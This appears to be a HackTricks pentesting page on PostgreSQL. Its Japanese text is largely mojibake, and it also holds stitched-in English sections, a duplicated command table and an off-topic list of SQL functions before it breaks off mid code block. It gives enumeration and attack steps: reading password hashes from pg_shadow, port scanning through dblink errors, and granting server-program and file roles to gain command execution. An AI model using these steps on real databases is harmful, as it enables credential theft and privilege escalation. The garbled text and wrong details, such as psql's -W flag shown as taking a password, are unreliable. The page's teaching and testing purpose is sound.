# 5432,5433 - PostgreSQLã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆ

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚å…ˆé€²çš„ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸ**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰**ãŠã‚ˆã³**è‡ªå‹•åŒ–**ã—ã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## **åŸºæœ¬æƒ…å ±**

**PostgreSQL**ã¯ã€SQLè¨€èªã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆé–¢ä¿‚ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚·ã‚¹ãƒ†ãƒ ã§ã™ã€‚

**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆï¼š** 5432ã§ã€ã“ã®ãƒãƒ¼ãƒˆãŒæ—¢ã«ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãŠãã‚‰ãä½¿ç”¨ã•ã‚Œã¦ã„ãªã„æ¬¡ã®ãƒãƒ¼ãƒˆï¼ˆãŠãã‚‰ã5433ï¼‰ãŒpostgresqlã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## æ¥ç¶š

To connect to a PostgreSQL database, you can use the `psql` command-line tool. The basic syntax is as follows:

```bash
psql -h <host> -p <port> -U <username> -d <database>
```

- `<host>`: The hostname or IP address of the PostgreSQL server.
- `<port>`: The port number on which the PostgreSQL server is listening (default is 5432).
- `<username>`: The username to connect to the database.
- `<database>`: The name of the database to connect to.

If the PostgreSQL server is running on the local machine, you can omit the `-h` option and use `localhost` as the `<host>` value. Similarly, if the server is using the default port, you can omit the `-p` option.

Once connected, you will be prompted to enter the password for the specified username. If the password is correct, you will be logged in to the PostgreSQL database and can start executing SQL queries. To exit the `psql` tool, you can use the `\q` command.

Note: Make sure you have the necessary permissions to connect to the database.
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
Select user;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;

# Get history of commands executed
\s
```
**åˆ—æŒ™**

PostgreSQLã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ä¹±ç”¨ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã®è©³ç´°ã¯ã€ä»¥ä¸‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³**

[**ã“ã®ç ”ç©¶**](https://www.exploit-db.com/papers/13084)ã«ã‚ˆã‚‹ã¨ã€æ¥ç¶šè©¦è¡ŒãŒå¤±æ•—ã—ãŸå ´åˆã€`dblink`ã¯`sqlclient_unable_to_establish_sqlconnection`ã¨ã„ã†ä¾‹å¤–ã‚’ã‚¹ãƒ­ãƒ¼ã—ã€ã‚¨ãƒ©ãƒ¼ã®èª¬æ˜ã‚’å«ã‚ã¾ã™ã€‚ä»¥ä¸‹ã«ã“ã‚Œã‚‰ã®è©³ç´°ã®ä¾‹ã‚’ç¤ºã—ã¾ã™ã€‚
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* ãƒ›ã‚¹ãƒˆãŒãƒ€ã‚¦ãƒ³ã—ã¦ã„ã¾ã™

`è©³ç´°: ã‚µãƒ¼ãƒãƒ¼ã«æ¥ç¶šã§ãã¾ã›ã‚“ã§ã—ãŸ: ãƒ›ã‚¹ãƒˆã¸ã®ãƒ«ãƒ¼ãƒˆãŒã‚ã‚Šã¾ã›ã‚“ã€‚ãƒ›ã‚¹ãƒˆã€Œ1.2.3.4ã€ã§TCP/IPæ¥ç¶šã‚’ãƒãƒ¼ãƒˆ5678ã§å—ã‘ä»˜ã‘ã¦ã„ã¾ã™ã‹ï¼Ÿ`

* ãƒãƒ¼ãƒˆãŒé–‰ã˜ã¦ã„ã¾ã™
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* ãƒãƒ¼ãƒˆãŒé–‹ã„ã¦ã„ã¾ã™
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
ã¾ãŸã¯
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* ãƒãƒ¼ãƒˆãŒé–‹ã„ã¦ã„ã‚‹ã‹ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã•ã‚Œã¦ã„ã‚‹ã‹
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
æ®‹å¿µãªãŒã‚‰ã€PL/pgSQLé–¢æ•°å†…ã§ä¾‹å¤–ã®è©³ç´°ã‚’å–å¾—ã™ã‚‹æ–¹æ³•ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ãŸã ã—ã€PostgreSQLã‚µãƒ¼ãƒãƒ¼ã«ç›´æ¥æ¥ç¶šã§ãã‚Œã°ã€è©³ç´°ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã‚·ã‚¹ãƒ†ãƒ ãƒ†ãƒ¼ãƒ–ãƒ«ã‹ã‚‰ç›´æ¥ãƒ¦ãƒ¼ã‚¶åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ããªã„å ´åˆã¯ã€å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§èª¬æ˜ã—ãŸãƒ¯ãƒ¼ãƒ‰ãƒªã‚¹ãƒˆæ”»æ’ƒãŒæˆåŠŸã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

## ç‰¹æ¨©ã®åˆ—æŒ™

### ãƒ­ãƒ¼ãƒ«

| ãƒ­ãƒ¼ãƒ«ã®ç¨®é¡   |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | ãƒ­ãƒ¼ãƒ«ã«ã¯ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ç‰¹æ¨©ãŒã‚ã‚Šã¾ã™                                                                                                                        |
| rolinherit     | ãƒ­ãƒ¼ãƒ«ã¯ã€ãã®ãƒ¡ãƒ³ãƒãƒ¼ã§ã‚ã‚‹ãƒ­ãƒ¼ãƒ«ã®ç‰¹æ¨©ã‚’è‡ªå‹•çš„ã«ç¶™æ‰¿ã—ã¾ã™                                                                                                    |
| rolcreaterole  | ãƒ­ãƒ¼ãƒ«ã¯ä»–ã®ãƒ­ãƒ¼ãƒ«ã‚’ä½œæˆã§ãã¾ã™                                                                                                                           |
| rolcreatedb    | ãƒ­ãƒ¼ãƒ«ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ä½œæˆã§ãã¾ã™                                                                                                                            |
| rolcanlogin    | ãƒ­ãƒ¼ãƒ«ã¯ãƒ­ã‚°ã‚¤ãƒ³ã§ãã¾ã™ã€‚ã¤ã¾ã‚Šã€ã“ã®ãƒ­ãƒ¼ãƒ«ã¯åˆæœŸã‚»ãƒƒã‚·ãƒ§ãƒ³èªè¨¼è­˜åˆ¥å­ã¨ã—ã¦ä¸ãˆã‚‹ã“ã¨ãŒã§ãã¾ã™                                                     |
| rolreplication | ãƒ­ãƒ¼ãƒ«ã¯ãƒ¬ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ­ãƒ¼ãƒ«ã§ã™ã€‚ãƒ¬ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ­ãƒ¼ãƒ«ã¯ãƒ¬ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³æ¥ç¶šã‚’é–‹å§‹ã—ã€ãƒ¬ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚¹ãƒ­ãƒƒãƒˆã‚’ä½œæˆãŠã‚ˆã³å‰Šé™¤ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚                           |
| rolconnlimit   | ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ãƒ­ãƒ¼ãƒ«ã®å ´åˆã€ã“ã®è¨­å®šã¯ã“ã®ãƒ­ãƒ¼ãƒ«ãŒä½œæˆã§ãã‚‹åŒæ™‚æ¥ç¶šã®æœ€å¤§æ•°ã‚’è¨­å®šã—ã¾ã™ã€‚-1ã¯åˆ¶é™ãªã—ã‚’æ„å‘³ã—ã¾ã™ã€‚                                 |
| rolpassword    | ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§ã¯ã‚ã‚Šã¾ã›ã‚“ï¼ˆå¸¸ã«`********`ã¨è¡¨ç¤ºã•ã‚Œã¾ã™ï¼‰                                                                                                        |
| rolvaliduntil  | ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®æœ‰åŠ¹æœŸé™ï¼ˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰èªè¨¼ã«ã®ã¿ä½¿ç”¨ã•ã‚Œã‚‹ï¼‰ã€‚æœŸé™ãŒãªã„å ´åˆã¯nullã§ã™ã€‚                                                                  |
| rolbypassrls   | ãƒ­ãƒ¼ãƒ«ã¯ã™ã¹ã¦ã®è¡Œãƒ¬ãƒ™ãƒ«ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€[ã‚»ã‚¯ã‚·ãƒ§ãƒ³5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚ |
| rolconfig      | å®Ÿè¡Œæ™‚è¨­å®šå¤‰æ•°ã®ãƒ­ãƒ¼ãƒ«å›ºæœ‰ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆ                                                                                                                    |
| oid            | ãƒ­ãƒ¼ãƒ«ã®ID                                                                                                                                           |

#### èˆˆå‘³æ·±ã„ã‚°ãƒ«ãƒ¼ãƒ—

* ã‚‚ã—**`pg_execute_server_program`**ã®ãƒ¡ãƒ³ãƒãƒ¼ã§ã‚ã‚Œã°ã€**ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’å®Ÿè¡Œ**ã§ãã¾ã™
* ã‚‚ã—**`pg_read_server_files`**ã®ãƒ¡ãƒ³ãƒãƒ¼ã§ã‚ã‚Œã°ã€**ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹**ã“ã¨ãŒã§ãã¾ã™
* ã‚‚ã—**`pg_write_server_files`**ã®ãƒ¡ãƒ³ãƒãƒ¼ã§ã‚ã‚Œã°ã€**ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›¸ãè¾¼ã‚€**ã“ã¨ãŒã§ãã¾ã™

{% hint style="info" %}
Postgresã§ã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã€**ã‚°ãƒ«ãƒ¼ãƒ—**ã€**ãƒ­ãƒ¼ãƒ«**ã¯**åŒã˜ã‚‚ã®**ã§ã™ã€‚ãã‚Œã¯å˜ã«**ä½¿ç”¨æ–¹æ³•**ã¨**ãƒ­ã‚°ã‚¤ãƒ³ã‚’è¨±å¯ã™ã‚‹ã‹ã©ã†ã‹**ã«ä¾å­˜ã—ã¾ã™ã€‚
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### ãƒ†ãƒ¼ãƒ–ãƒ«

| Command | Description |
|---------|-------------|
| `\dt`   | List all tables in the current database. |
| `\d+`   | Show detailed information about a specific table. |
| `\d table_name` | Show detailed information about a specific table. |
| `\dS`   | Show detailed information about system tables. |
| `\dS+`  | Show detailed information about system tables, including additional statistics. |
| `\d+ table_name` | Show detailed information about a specific table, including additional statistics. |
| `\l+`   | List all databases, including additional information such as size and description. |
| `\du`   | List all users and their roles. |
| `\dp`   | List all privileges on database objects. |
| `\df`   | List all functions. |
| `\dv`   | List all views. |
| `\di`   | List all indexes. |
| `\ds`   | List all sequences. |
| `\dm`   | List all materialized views. |
| `\dT`   | List all data types. |
| `\dc`   | List all conversions. |
| `\do`   | List all operators. |
| `\dC`   | List all collations. |
| `\dE`   | List all foreign data wrappers. |
| `\dx`   | List all extensions. |
| `\dy`   | List all event triggers. |
| `\dD`   | List all domains. |
| `\dF`   | List all text search configurations. |
| `\dL`   | List all procedural languages. |
| `\dO`   | List all operators of a specific type. |
| `\dT+`  | Show detailed information about a specific data type. |
| `\dC+`  | Show detailed information about a specific collation. |
| `\dE+`  | Show detailed information about a specific foreign data wrapper. |
| `\dx+`  | Show detailed information about a specific extension. |
| `\dy+`  | Show detailed information about a specific event trigger. |
| `\dD+`  | Show detailed information about a specific domain. |
| `\dF+`  | Show detailed information about a specific text search configuration. |
| `\dL+`  | Show detailed information about a specific procedural language. |
| `\dO+`  | Show detailed information about a specific operator of a specific type. |

| ã‚³ãƒãƒ³ãƒ‰ | èª¬æ˜ |
|---------|-------------|
| `\dt`   | ç¾åœ¨ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã®ã™ã¹ã¦ã®ãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\d+`   | ç‰¹å®šã®ãƒ†ãƒ¼ãƒ–ãƒ«ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ |
| `\d table_name` | ç‰¹å®šã®ãƒ†ãƒ¼ãƒ–ãƒ«ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ |
| `\dS`   | ã‚·ã‚¹ãƒ†ãƒ ãƒ†ãƒ¼ãƒ–ãƒ«ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ |
| `\dS+`  | è¿½åŠ ã®çµ±è¨ˆæƒ…å ±ã‚’å«ã‚€ã‚·ã‚¹ãƒ†ãƒ ãƒ†ãƒ¼ãƒ–ãƒ«ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ |
| `\d+ table_name` | è¿½åŠ ã®çµ±è¨ˆæƒ…å ±ã‚’å«ã‚€ç‰¹å®šã®ãƒ†ãƒ¼ãƒ–ãƒ«ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ |
| `\l+`   | ã‚µã‚¤ã‚ºã‚„èª¬æ˜ãªã©ã®è¿½åŠ æƒ…å ±ã‚’å«ã‚€ã™ã¹ã¦ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\du`   | ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ãã®å½¹å‰²ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\dp`   | ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã™ã¹ã¦ã®æ¨©é™ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\df`   | ã™ã¹ã¦ã®é–¢æ•°ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\dv`   | ã™ã¹ã¦ã®ãƒ“ãƒ¥ãƒ¼ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\di`   | ã™ã¹ã¦ã®ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\ds`   | ã™ã¹ã¦ã®ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\dm`   | ã™ã¹ã¦ã®ãƒãƒ†ãƒªã‚¢ãƒ©ã‚¤ã‚ºãƒ‰ãƒ“ãƒ¥ãƒ¼ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\dT`   | ã™ã¹ã¦ã®ãƒ‡ãƒ¼ã‚¿å‹ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\dc`   | ã™ã¹ã¦ã®å¤‰æ›ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\do`   | ã™ã¹ã¦ã®æ¼”ç®—å­ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\dC`   | ã™ã¹ã¦ã®ç…§åˆé †åºã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\dE`   | ã™ã¹ã¦ã®å¤–éƒ¨ãƒ‡ãƒ¼ã‚¿ãƒ©ãƒƒãƒ‘ãƒ¼ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\dx`   | ã™ã¹ã¦ã®æ‹¡å¼µæ©Ÿèƒ½ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\dy`   | ã™ã¹ã¦ã®ã‚¤ãƒ™ãƒ³ãƒˆãƒˆãƒªã‚¬ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\dD`   | ã™ã¹ã¦ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\dF`   | ã™ã¹ã¦ã®ãƒ†ã‚­ã‚¹ãƒˆæ¤œç´¢è¨­å®šã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\dL`   | ã™ã¹ã¦ã®æ‰‹ç¶šãè¨€èªã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\dO`   | ç‰¹å®šã®ã‚¿ã‚¤ãƒ—ã®æ¼”ç®—å­ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ã€‚ |
| `\dT+`  | ç‰¹å®šã®ãƒ‡ãƒ¼ã‚¿å‹ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ |
| `\dC+`  | ç‰¹å®šã®ç…§åˆé †åºã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ |
| `\dE+`  | ç‰¹å®šã®å¤–éƒ¨ãƒ‡ãƒ¼ã‚¿ãƒ©ãƒƒãƒ‘ãƒ¼ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ |
| `\dx+`  | ç‰¹å®šã®æ‹¡å¼µæ©Ÿèƒ½ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ |
| `\dy+`  | ç‰¹å®šã®ã‚¤ãƒ™ãƒ³ãƒˆãƒˆãƒªã‚¬ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ |
| `\dD+`  | ç‰¹å®šã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ |
| `\dF+`  | ç‰¹å®šã®ãƒ†ã‚­ã‚¹ãƒˆæ¤œç´¢è¨­å®šã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ |
| `\dL+`  | ç‰¹å®šã®æ‰‹ç¶šãè¨€èªã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ |
| `\dO+`  | ç‰¹å®šã®ã‚¿ã‚¤ãƒ—ã®æ¼”ç®—å­ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ |
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### é–¢æ•°

PostgreSQLã¯ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã§ä½¿ç”¨ã§ãã‚‹ã•ã¾ã–ã¾ãªé–¢æ•°ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã®é–¢æ•°ã¯ã€ãƒ‡ãƒ¼ã‚¿ã®æ“ä½œã‚„è¨ˆç®—ã€å¤‰æ›ãªã©ã®ç›®çš„ã§ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ä»¥ä¸‹ã«ã€ã‚ˆãä½¿ç”¨ã•ã‚Œã‚‹é–¢æ•°ã®ã„ãã¤ã‹ã‚’ç´¹ä»‹ã—ã¾ã™ã€‚

#### æ–‡å­—åˆ—é–¢æ•°

- `length(string)`ï¼šæŒ‡å®šã—ãŸæ–‡å­—åˆ—ã®é•·ã•ã‚’è¿”ã—ã¾ã™ã€‚
- `substring(string, start, length)`ï¼šæŒ‡å®šã—ãŸæ–‡å­—åˆ—ã®ä¸€éƒ¨ã‚’åˆ‡ã‚Šå‡ºã—ã¾ã™ã€‚
- `concat(string1, string2)`ï¼š2ã¤ã®æ–‡å­—åˆ—ã‚’é€£çµã—ã¾ã™ã€‚
- `lower(string)`ï¼šæŒ‡å®šã—ãŸæ–‡å­—åˆ—ã‚’å°æ–‡å­—ã«å¤‰æ›ã—ã¾ã™ã€‚
- `upper(string)`ï¼šæŒ‡å®šã—ãŸæ–‡å­—åˆ—ã‚’å¤§æ–‡å­—ã«å¤‰æ›ã—ã¾ã™ã€‚

#### æ•°å€¤é–¢æ•°

- `abs(number)`ï¼šæŒ‡å®šã—ãŸæ•°å€¤ã®çµ¶å¯¾å€¤ã‚’è¿”ã—ã¾ã™ã€‚
- `round(number, decimal_places)`ï¼šæŒ‡å®šã—ãŸæ•°å€¤ã‚’æŒ‡å®šã—ãŸå°æ•°æ¡æ•°ã«ä¸¸ã‚ã¾ã™ã€‚
- `floor(number)`ï¼šæŒ‡å®šã—ãŸæ•°å€¤ã‚’åˆ‡ã‚Šæ¨ã¦ã¾ã™ã€‚
- `ceiling(number)`ï¼šæŒ‡å®šã—ãŸæ•°å€¤ã‚’åˆ‡ã‚Šä¸Šã’ã¾ã™ã€‚

#### æ—¥ä»˜é–¢æ•°

- `now()`ï¼šç¾åœ¨ã®æ—¥æ™‚ã‚’è¿”ã—ã¾ã™ã€‚
- `date_part('part', date)`ï¼šæŒ‡å®šã—ãŸæ—¥ä»˜ã®ç‰¹å®šã®éƒ¨åˆ†ï¼ˆå¹´ã€æœˆã€æ—¥ãªã©ï¼‰ã‚’è¿”ã—ã¾ã™ã€‚
- `date_trunc('part', date)`ï¼šæŒ‡å®šã—ãŸæ—¥ä»˜ã‚’æŒ‡å®šã—ãŸéƒ¨åˆ†ã¾ã§åˆ‡ã‚Šæ¨ã¦ã¾ã™ã€‚

ã“ã‚Œã‚‰ã®é–¢æ•°ã¯ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã§ã®ãƒ‡ãƒ¼ã‚¿æ“ä½œã‚„ã‚¯ã‚¨ãƒªã®ä½œæˆã«å½¹ç«‹ã¡ã¾ã™ã€‚
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
